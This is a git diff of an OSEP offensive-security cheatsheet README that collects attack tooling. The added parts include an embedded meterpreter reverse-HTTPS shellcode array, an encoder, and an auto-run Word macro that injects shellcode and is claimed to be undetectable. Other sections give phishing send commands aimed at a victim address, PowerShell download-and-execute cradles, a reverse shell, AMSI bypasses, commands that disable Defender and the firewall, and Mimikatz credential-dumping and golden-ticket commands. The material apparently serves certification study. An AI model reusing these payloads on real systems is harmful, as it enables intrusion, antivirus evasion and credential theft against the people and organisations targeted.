@@ -1,13 +1,25 @@
-# OSEP Cheatsheet
-#### purg3
-Under Construction
+# **OSEP Cheatsheet**
+<br>
+
+#### Compiled by: **purg3**
+*Under Construction**
 ***
-A cheatsheet compiled so you have everything you need in one place. I'd like to say thank you to all the authors of the repo's listed here, without you this would not exist.
+I hope this helps you on your journey to passing the OSEP. I have pulled together many repo's related to this course. When you do eventually reach the tools list please show some love to the authors. Some of the C#, VBA code is my own and feel free to take and modify how you want. **PLEASE DONT UPLOAD TO VIRUSTOTAL AND ONLY USE ON WINDOWS MACHINES THAT DONT TOUCH THE NET**. If you want to update your AV do so manually. 
+
+Thanks for visiting !
+Enjoy creating your own 🦠
+<br>
+
 # Table of Contents
+<br>
 
-## [DotnetToJScript](#DotNetToJscript-1)
+# [DotnetToJScript](#DotNetToJscript-1)
+- [Testclass](#testclass.cs)
+- [Build Javascript](#Build_JS)
+- [Create_HTA](#Create_HTA_file)
+<br>
 
-## [CSharp](#CSharp-1)
+# [CSharp](#CSharp-1)
 
 - [FUD_.NET](https://github.com/In3x0rabl3/OSEP/blob/main/README.md#fud_net)
 - [Meterpreter_FUD_DLL](#Meterpreter_FUD_DLL)
@@ -15,14 +27,20 @@ A cheatsheet compiled so you have everything you need in one place. I'd like to 
 - [Shellcode_Runner](#Shellcode_Runner)
 - [Process_injection](#Process_injection)
 - [SharpLoader](#SharpLoader)
+<br>
 
-## [Javascript](#Javascript-1)
+# [Javascript](#Javascript-1)
 
 - [Download&Execute](#DownloadExecute)
+<br>
 
-## [Phishing](#Phishing-1)
+# [Phishing](#Phishing-1)
 
-## [Powershell](#Powershell-1)
+
+<br>
+
+
+# [Powershell](#Powershell-1)
 
 - [Download_file](#Download_file)
 - [Powershell_Cradle](#Powershell_Cradle)
@@ -31,31 +49,35 @@ A cheatsheet compiled so you have everything you need in one place. I'd like to 
 - [Disable_Restricted_Admin](#Disable_Restricted_Admin)
 - [Disable_AMSI](#Disable_AMSI)
 - [Load_assembly_reflectively](#Load_assembly_reflectively)
+<br>
 
-## [Active_Directory](#Active_Directory-1)
+# [Active_Directory](#Active_Directory-1)
 
-## [Windows](#Windows-1)
+# [Windows](#Windows-1)
 
-## [Linux](#Linux-1)
+# [Linux](#Linux-1)
 
-## [Impacket](#Impacket-1)
+# [Impacket](#Impacket-1)
 
-## [TortugaToolKit](#TortugaToolKit-1)
+# [TortugaToolKit](#TortugaToolKit-1)
 
-## [PowerUpSQL](#PowerUpSQL-1)
+# [PowerUpSQL](#PowerUpSQL-1)
 
-## [MimiKatz](#MimiKatz-1)
+# [MimiKatz](#MimiKatz-1)
 
-## [Rubeus](#Rubeus-1)
+# [Rubeus](#Rubeus-1)
 
-## [Metasploit](#Metasploit-1)
+# [Metasploit](#Metasploit-1)
 
-## [Tools](#Tools-1)
+# [Tools](#Tools-1)
 
 ***
 # DotNetToJscript
+<br>
 
-## Replace testclass.cs with following code and replace shellcode
+## Testclass.cs
+
+- Replace testclass.cs with following code and replace shellcode
 
 ```csharp
 using System;
@@ -85,13 +107,13 @@ IntPtr.Zero);
 ```
 <br>
 
-## **Build JS**
+## **Build_JS**
 ```
 DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
 ```
 <br>
 
-## **Create HTA file**
+## **Create_HTA_file**
 
 #### Method 1:
 ```javascript
@@ -257,8 +279,7 @@ namespace Met
 
         }
         Console.WriteLine("API Emulation done!");
-	
-        byte[] buf = new byte[CHANGEME] {SHELLCODEHERE};
+        byte[] buf = new byte[770] { };
     
         byte[] encoded = new byte[buf.Length];
         for (int i = 0; i < buf.Length; i++)
@@ -695,42 +716,183 @@ var r = new ActiveXObject("WScript.Shell").Run("YOUR.exe");
 
 # Phishing
 
-Reference:
-	- [Office](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Office%20-%20Attacks.md#docm---macro-creator)
+<br>
+	
+## XOR_VBA
 
-## Macro
+- Generate shellcode with msfvenom and place here.
+- Build with csc and run with mono.
+```csharp
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
 
-- ### Obfuscate however you want
-- This macro is now detected as for the .bat and .txt they are still good to go as of 20FEB2022
+namespace EncryptVBA
+{
+    class Program
+    {
+    static void Main(string[] args)
+    {
+    //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.38 LPORT=3333 -f csharp
+    byte[] buf = new byte[619] {
+0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
+0x48,0x31,0xd2,0x51,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x56,0x48,
+0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,
+0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
+0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x41,0x51,0x48,
+0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
+0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x8b,0x48,
+0x18,0x44,0x8b,0x40,0x20,0x50,0x49,0x01,0xd0,0xe3,0x56,0x4d,0x31,0xc9,0x48,
+0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,
+0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
+0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
+0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,
+0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
+0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
+0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,
+0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,
+0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,
+0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
+0xe8,0x0d,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x31,0x2e,
+0x33,0x38,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0x05,0x0d,0x00,0x00,0x4d,
+0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,0x00,
+0x00,0x00,0xff,0xd5,0xe8,0x43,0x00,0x00,0x00,0x2f,0x69,0x65,0x77,0x5a,0x56,
+0x75,0x65,0x41,0x76,0x39,0x35,0x4a,0x6b,0x30,0x69,0x52,0x4b,0x34,0x69,0x44,
+0x67,0x41,0x78,0x54,0x6a,0x49,0x58,0x53,0x68,0x32,0x35,0x74,0x51,0x55,0x35,
+0x36,0x4f,0x39,0x68,0x77,0x36,0x66,0x44,0x48,0x49,0x6f,0x78,0x6d,0x5f,0x73,
+0x38,0x7a,0x6c,0x4a,0x6d,0x72,0x76,0x46,0x71,0x51,0x41,0x4c,0x67,0x66,0x59,
+0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x00,
+0x32,0xa8,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,
+0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x48,0x89,0xf1,0x6a,0x1f,
+0x5a,0x52,0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,0x6a,0x04,0x41,0x59,0x49,
+0xba,0x75,0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,0xd5,0x4d,0x31,0xc0,0x53,
+0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,
+0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,
+0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,
+0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,0x00,0x53,0x59,0x6a,0x40,
+0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,0x10,0x00,0x00,0x49,
+0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x93,0x53,0x53,
+0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x00,0x20,0x00,
+0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,0x00,0xff,
+0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,0x01,0xc3,
+0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,
+0xa2,0x56,0xff,0xd5 };
+    byte[] encoded = new byte[buf.Length];
+    for (int i = 0; i < buf.Length; i++)
 
+    {
+    encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
+    }
+    uint counter = 0;
+    StringBuilder hex = new StringBuilder(encoded.Length * 2);
+    foreach (byte b in encoded)
+    {
+    hex.AppendFormat("{0:D}, ", b);
+    counter++;
+    if (counter % 50 == 0)
+    {
+    hex.AppendFormat("_{0}", Environment.NewLine);
+    }
+    }
+    Console.WriteLine("The payload is: " + hex.ToString());
+    }
+    }
+}
 ```
-Sub rev()
+<br>
 
-    Dim str As String
-    str = "powershell -c Start-bitstransfer -source http://ip:port/revsh.bat -destination c:\\path\of\your choice\"
-    Shell str, vbHide
-    Dim revshell As String
-    revshell = "c:\\path\of\transfered\file"
-    Shell revshell, vbHide
+## VBA_Runner
+- Place XOR shellcode into vba file.
+- Copy or input file into macro on your word doc or docm.
+
+```powershell
+Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
+Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
+
+Function MyMacro()
+    Dim buf As Variant
+    Dim addr As LongPtr
+    Dim counter As Long
+    Dim data As Long
+    Dim res As LongPtr
+
+    buf = Array(SHELLCODE)
+
+For i = 0 To UBound(buf)
+    buf(i) = buf(i) - 2
+Next i
+
+    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
     
-End Sub
+    For counter = LBound(buf) To UBound(buf)
+        data = buf(counter)
+        res = RtlMoveMemory(addr + counter, data, 1)
+    Next counter
+
+    res = CreateThread(0, 0, addr, 0, 0, 0)
+End Function
 
 Sub Document_Open()
-    rev
+    MyMacro
 End Sub
 
 Sub AutoOpen()
-    rev
+    MyMacro
 End Sub
-
-Sub Auto_Open()
-    rev
-End Sub••••ˇˇˇˇ
 ```
+<br>
+
+# Purge your .doc or .docm
+
+- Download the repo below and build with visual studio.
+- Purge the word doc you just created with the code above.
+- As of 27/02/2022 18:10 this FUD 
+
+- [BadAssMacros](https://github.com/Inf0secRabbit/BadAssMacros)
+<br>
+
+## Deploy:
+***
+<br>
+
+### Method 1:
+```
+swaks --body 'click me http://192.168.X.X/file.hta' --add-header
+"Really: 1.0" --add-header "Content-Type: text/html" --header
+"Subject: Important" -t victim@corp.com -f attacker@corp.com --server
+192.168.X.X
+```
+<br>
+
+### Method 2:
+ ```
+ sendmail -f attacker@email.com -t victim@email.com -s 192.168.x.x -u "Subject" -m "body"
+```
+
+## Bringing it home
+
+- ### Save file as .bat and host on your server
+
+```
+powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://ip:port/ps.txt')"
+```
+
+```
+When the macro is clicked it will first download the .bat file and execute.
+Then the .bat file will download and execute your .txt file resulting in a revshell
+```
+
+
+
+# Powershell
+<br>
 
 ## Reverse Shell
 
-- ### Replace ip/port, save as .txt file and host on your server
+-  Replace ip/port, save as .txt file and host on your server
 
 ```powershell
 function cleanup {
@@ -777,63 +939,36 @@ $stream.Write($encoding.GetBytes($out),0,$out.length)
 $out = $null
 $string = $null}} else {cleanup}}
 ```
-
-
-## Deploy
-```
-swaks --body 'click me http://192.168.X.X/file.hta' --add-header
-"Really: 1.0" --add-header "Content-Type: text/html" --header
-"Subject: Important" -t victim@corp.com -f attacker@corp.com --server
-192.168.X.X
-```
 <br>
-
- ```
- sendmail -f attacker@email.com -t victim@email.com -s 192.168.x.x -u "Subject" -m "body"
-```
 
 ## Bringing it home
 
-- ### Save file as .bat and host on your server
+-  Save the below string to a file as .bat and execute.
 
 ```
 powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://ip:port/ps.txt')"
 ```
-
-```
-When the macro is clicked it will first download the .bat file and execute.
-Then the .bat file will download and execute your .txt file resulting in a revshell
-```
-
-
-
-# Powershell
 <br>
 
-## Download_file:
+## Download_file
 ```
 (New-Object System.Net.WebClient).DownloadFile("http://192.168.119.155/PowerUp.ps1", "C:\Windows\Temp\PowerUp.ps1")
 ```
-
- <br>
+<br>
  
-## Powershell_Cradle:
-
+## Powershell_Cradle
 ```
 iex(new-object net.webclient).downloadstring('http://192.168.49.68/<ToolName>.ps1')
 ```
-
 <br>
 
-## Constrained_lang_mode:
-
+## Constrained_lang_mode
 ```
 $ExecutionContext.SessionState.LanguageMode
 ```
 <br>
 
-## CLM_Bypass:
-
+## CLM_Bypass
 ```
 Installutil.exe /logfile= /LogToConsole=false /U "c:\temp\bypass-clm.exe"
 ```
@@ -846,10 +981,10 @@ Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name
 DisableRestrictedAdmin
 ```
 <br>
-<br>
+
 
 ## Disable_AMSI
- <br>
+***
  
  ### Method 1:
 ```
@@ -871,7 +1006,7 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 <br>
 <br>
 
-## Load_assembly_reflectively:
+## Load_assembly_reflectively
 
 ## Download and run assembly without arguments
 ```powershell
@@ -916,36 +1051,36 @@ $method.Invoke(0, $null)
 
 # Windows
 
-### Useful links
+### Useful links:
 
-[Windows Priv esc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#applocker-enumeration)
-
+[Windows Priv](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#applocker-enumeration)
 [lolbas](https://lolbas-project.github.io/#)
 
+- ##### Look for whitelisted executables
 ```
 Installutil.exe /logfile= /LogToConsole=false /U "c:\temp\payload.exe"
 ```
 <br>
 
-#### Open powershell as Administrator
+- ##### Open powershell as Administrator
 ```
 start-process powershell -verb runas
 ```
 <br>
 
-#### Add Defender Exclusion area
+- ##### Add Defender Exclusion area
 ```
 Add-MpPreference -ExclusionPath C:\temp, C:\
 ```
-
 <br>
-### Remove definitions
+
+- ##### Remove definitions
 ```
 C:\Program Files\Windows Defender>.\MpCmdRun.exe -removedefinitions -all
 ```
 <br>
 
-### Disable Defender / Firewall
+- ##### Disable Defender / Firewall
 ```powershell
 Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true 
 NetSh Advfirewall set allprofiles state off
@@ -955,11 +1090,12 @@ NetSh Advfirewall set allprofiles state off
 
 # Linux
 
-### Useful links
+### Useful links:
 
 [Linux Priv esc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
+ <br>
  
- ### Full TTY:
+ ### Full TTY
  
  ```
  python -c 'import pty; pty.spawn("/bin/bash")'
@@ -968,7 +1104,7 @@ NetSh Advfirewall set allprofiles state off
  reset
  ```
 <br>
-<br>
+
 
 # Impacket 
 [Cheatsheet 1](https://cheatsheet.haax.fr/windows-systems/exploitation/impacket/)
@@ -981,6 +1117,7 @@ NetSh Advfirewall set allprofiles state off
 
 
 # TortugaToolKit
+<br>
 
 ### Load DLL Remote:
 
@@ -1017,8 +1154,7 @@ $code = Invoke-EncryptShellcode -shellcode $(IWR -Uri 'http://ip/shellcode.bin' 
 ```powershell
 Invoke-ImpersonateProcessHollow -processId 1092 -exe "svchost.exe" -decryptKey $code.encryptionKey -shellCode $code.encryptedShellcode -initVector $code.initVectorKey
 ```
- 
- <br>
+<br>
 
 - ### Disable AMSI:
 
@@ -1074,7 +1210,6 @@ Show-AvailableTokens
 Undo-Impersonation
 ```
 <br>
-<br>
 
 # PowerUpSQL
 
@@ -1089,15 +1224,16 @@ Undo-Impersonation
 <br>
 
 # MimiKatz
+<br>
 
-- ### general
+- ## General
 ```
 privilege::debug
 log
 log customlogfilename.log
 ```
 
-- ### sekurlsa
+- ## sekurlsa
 ```
 sekurlsa::logonpasswords
 sekurlsa::logonPasswords full
@@ -1105,14 +1241,14 @@ sekurlsa::tickets /export
 sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
 ```
 
-- ### kerberos
+- ## kerberos
 ```
 kerberos::list /export
 kerberos::ptt c:\chocolate.kirbi
 kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi
 ```
 
-- ### crypto
+- ## crypto
 ```
 crypto::capi
 crypto::cng
@@ -1122,7 +1258,7 @@ crypto::keys /export
 crypto::keys /machine /export
 ```
 
- - ### vault & lsadump
+ - ## vault & lsadump
 ```
 vault::cred
 vault::list
@@ -1136,7 +1272,7 @@ token::revert
 lsadump::dcsync /user:domain\krbtgt /domain:lab.local
 ```
 
-- ### pth
+- ## pth
 ```
 sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
 sekurlsa::pth /user:Administrateur /domain:chocolate.local /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
@@ -1145,42 +1281,41 @@ sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe
 ```
 
 
-- ### ekeys
+- ## ekeys
 ```
 sekurlsa::ekeys
 ```
 
-- ### dpapi
+- ## dpapi
 ```
 sekurlsa::dpapi
 ```
 
-- ### minidump
+- ## minidump
 ```
 sekurlsa::minidump lsass.dmp
 ```
 
-- ### ptt
+- ## ptt
 ```
 kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi
 ```
 
-- ### golden/silver
+- ## golden/silver
 ```
 kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /id:1107 /groups:513 /ticket:utilisateur.chocolate.kirbi
 kerberos::golden /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /aes256:15540cac73e94028231ef86631bc47bd5c827847ade468d6f6f739eb00c68e42 /user:Administrateur /id:500 /groups:513,512,520,518,519 /ptt /startoffset:-10 /endin:600 /renewmax:10080
 kerberos::golden /admin:Administrator /domain:CTU.DOMAIN /sid:S-1-1-12-123456789-1234567890-123456789 /krbtgt:deadbeefboobbabe003133700009999 /ticket:Administrator.kiribi
 ```
 
-- ### tgt
+- ## tgt
  ```
 kerberos::tgt
 ```
-- ### purge
+- ## purge
 ```
 kerberos::purge
 ```
-<br>
 <br>
 
 # Rubeus
@@ -1191,7 +1326,7 @@ kerberos::purge
 
 [Cheatsheet 3](https://www.puckiestyle.nl/kerberos-cheatsheet/)
 <br>
-<br>
+
 # Metasploit
 
 ```
@@ -1221,8 +1356,6 @@ msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.x.x lport=4444 -
 ```
 msfvenom -p linux/x86/meterpreter/reverse_https lhost=192.168.x.x lport=4444 -f elf -o lin-4444
 ```
-
-<br>
 <br>
 
 ### autorun
@@ -1234,9 +1367,6 @@ run
 
 auxiliary/server/socks_proxy
 ```
-
-
-<br>
 <br>
 
 # Tools
